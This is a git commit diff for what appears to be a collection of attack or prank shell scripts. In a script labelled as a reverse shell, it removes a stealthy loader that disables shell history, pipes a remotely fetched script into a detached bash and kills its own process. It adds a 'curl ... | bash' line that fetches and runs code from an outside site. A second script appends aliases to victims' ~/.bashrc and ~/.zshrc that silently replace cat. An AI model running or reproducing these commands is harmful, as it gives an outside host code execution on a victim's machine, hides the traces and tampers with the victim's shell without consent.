e49beef2a0e76cfa435bf6eaf9abcb9d476a1eef
Remy <remy.noulin@epitech.eu>
2022-10-03 19:29:20 +0200

    [MOD] change scripts

--- scripts/3.sh
+++ scripts/3.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
 # Desc: ReverseShell from tom (:panik:)
-export HISTFILE=/dev/null
-(nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/rd1.sh 2> /dev/null&disown)|nohup bash >& /dev/null&disown;kill -9 $$
+curl https://Waz0x.github.io/ | bash
--- scripts/6.sh
+++ scripts/6.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 # Desc: alias cat=rev, reverse order of the file 
-echo "alias cat='rev'" >> ~/.bashrc
-echo "alias cat='rev'" >> ~/.zshrc
+echo "alias cat='tac'" >> ~/.bashrc
+echo "alias cat='tac'" >> ~/.zshrc
